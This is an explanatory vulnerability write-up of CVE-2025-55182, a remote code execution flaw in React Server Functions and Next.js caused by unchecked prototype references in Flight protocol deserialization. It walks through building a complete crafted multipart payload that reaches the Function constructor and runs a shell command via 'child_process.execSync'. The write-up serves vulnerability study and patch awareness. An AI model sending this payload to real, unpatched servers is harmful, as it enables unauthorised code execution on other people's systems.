# CVE-2025-55182

This vulnerability allows RCE in React Server Functions, e.g. as
offered by Next.js through insecure prototype references.

I'm not an expert in React or Next.js, so take all the information
here with a grain of salt.

## Background

React offers Server Functions[^1], which can be seen as sort of an RPC-
over-HTTP. They can be used to fetch data from adjacent peers to ensure
low latency, or perform authenticated requests that the client lacks
credentials for.

React uses something called the React Flight Protocol[^2] for serialization
of values passed to Server Functions.

The client passes "chunks" to the server, e.g. via form data:

```py
files = {
    "0": (None, '["$1"]'),
    "1": (None, '{"object":"fruit","name":"$2:fruitName"}'),
    "2": (None, '{"fruitName":"cherry"}'),
}
```

As shown, these can have references in between each other.
The above payload deserializes to the following on the server:

```js
{ object: 'fruit', name: 'cherry' }
```

The format itself is a little more intricate and allows for more
complex serialization and deserialization, but this provides a
basic understanding for the actual vulnerability.

## Vulnerability

Until this commit[^3], when traversing chunks in reference resolving,
such as getting the `fruitName` from chunk 2 in the above example, React
didn't verify whether the requested key was actually set on the object.
This allowed us to get the object prototype[^4].

This can be demonstrated with a payload like this:

```py
files = {
    "0": (None, '["$1:__proto__:constructor:constructor"]'),
    "1": (None, '{"x":1}'),
}
```

Which deserializes to the function constructor[^5]:

```js
[Function: Function]
```

When the chunk with ID 0 is not an array but an object, we can
set the `then` key to the function constructor. The object is then
returned by the `decodeReplyFromBusboy` function and awaited by Next.js:

```ts
// action-handler.ts:888 (pre-patch)
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
```

When this returns a thenable, the `await` in the caller will call it.
This is what happens with this payload:

```py
files = {
    "0": (None, '{"then":"$1:__proto__:constructor:constructor"}'),
    "1": (None, '{"x":1}'),
}
```

Leading to this error:

```console-out
SyntaxError: Unexpected token 'function'
    at Object.Function [as then] (<anonymous>) {
      digest: '1259793845'
    }
```

The error looks like this since V8 calls an `await`ed function
with the internal `resolve` and `reject` functions, which, when
`toString`ed, serialize to something like this:

```js
function () { [native code] }
```

## Exploitation

Since we can trivially retrieve the `Function` constructor, the
straightforward way is to find a call gadget that invokes the
constructor with a user-controlled value (i.e., the code of the
function as a string), and later calls the returned function.

There are multiple places that can call the function constructor,
for example `resolveServerReference`, where `id` is a controlled object,
and `lastIndexOf` can be overwritten to return a user-controlled string
(e.g. via `Array.prototype.join`) and `slice` can be overwritten to the
function constructor. However, this place doesn't work as the second
invocation of `.slice()` supplies a number as the first argument,
which -to my best knowledge- can never be handled by the function
constructor.

Here, a brilliant idea from maple3142[^6] comes in. When `getChunk`
grabs the chunk at ID 0 as the root reference to start resolving the
reference chain, *this very same chunk* can resolve to a crafted
"fake chunk".

We can reference the crafted chunk 0 in chunk 1 by using the
`$@` syntax, which returns the "raw" chunk, not it's resolved value:

```js
case "@":
  return (
    (obj = parseInt(value.slice(2), 16)), getChunk(response, obj)
  );
```

Combining this with our `then` overwrite from above, we can craft
something like this:

```py
files = {
    "0": (None, '{"then": "$1:__proto__:then"}'),
    "1": (None, '"$@0"'),
}
```

Here, chunk 0 overwrites its own `.then()` with the `.then()` of
its own raw chunk representation. Put simply, we overwrite our
own `.then()` with `Chunk.prototype.then`, which exists, since
`Chunk`s are thenables:

```js
Chunk.prototype.then = function (resolve, reject) {
      switch (this.status) {
        case "resolved_model":
          initializeModelChunk(this);
      }
      // ...
```

With the above payload, `Chunk.prototype.then` is eventually called
with the crafted chunk with ID 0.

As shown above, when `.status` on our fake chunk is `resolved_model`:

```py
files = {
    "0": (None, '{"then": "$1:__proto__:then", "status": "resolved_model"}'),
    "1": (None, '"$@0"'),
}
```

We get into `initializeModelChunk`. Here, `.value` is parsed as JSON,
and then references are resolved on the returned object, using the "outer"
context of our chunks with IDs 0 and 1:

```js
function initializeModelChunk(chunk) {
    // ...
    var rawModel = JSON.parse(resolvedModel),
        value = reviveModel(chunk._response, { "": rawModel }, "", rawModel, rootReference);
    // ...
```

Within this, we now get a second pass of evaluation with a little more
values we have access to due to the outer context already being resolved.

There is a call gadget in the handling of blob data with the `$B` prefix
in the flight protocol:

```js
case "B":
  return (
    (obj = parseInt(value.slice(2), 16)),
    response._formData.get(response._prefix + obj)
  );
```

Using the special `_response` field, we control the `response` property
of the crafted chunk:

```js
// in initializeModelChunk
value = reviveModel(chunk._response, // ...
```

With this, we can craft an object with fake `._formData` and `._prefix`
properties:

```py
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"return foo; // ",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}
```

The `.reason` needs to be added to circumvent failing on the `toString`
invocation in `initializeModelChunk:

```js
var rootReference = -1 === chunk.reason ? void 0 : chunk.reason.toString(16), resolvedModel = chunk.value;
```

By pointing `._formData` to the function constructor, and `._prefix` to
our code, we get an invocation gadget for the function constructor in
the blob deserialization:

```js
response._formData.get(response._prefix + "0")
// becomes
Function("return foo; // 0")
```

Our crafted function is then returned by `parseModelString` as the
`.then()` method of the crafted chunk, which is also awaited, since
all of this takes place in a single promise resolving chain. Thus,
returning a thenable, our crafted function gets called. This constitutes
the required call gadget referenced above.

Putting this all together with an actual RCE payload, we get something
like this:

```py
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"process.mainModule.require('child_process').execSync('calc');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}
```

The bonus, which makes this vulnerability even worse, is that all of this
happens during deserialization, before the requested action is first validated
in `getActionModIdOrError`. Thus, setting a header like `Next-Action: foo` is
sufficient to trigger the vulnerability.

[^1]: <https://react.dev/reference/rsc/server-functions>
[^2]: <https://tonyalicea.dev/blog/understanding-react-server-components/>
[^3]: <https://github.com/facebook/react/pull/35277/commits/e2fd5dc6ad973dd3f220056404d0ae0a8707998d>
[^4]: <https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Advanced_JavaScript_objects/Object_prototypes>
[^5]: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function>
[^6]: <https://x.com/maple3142>
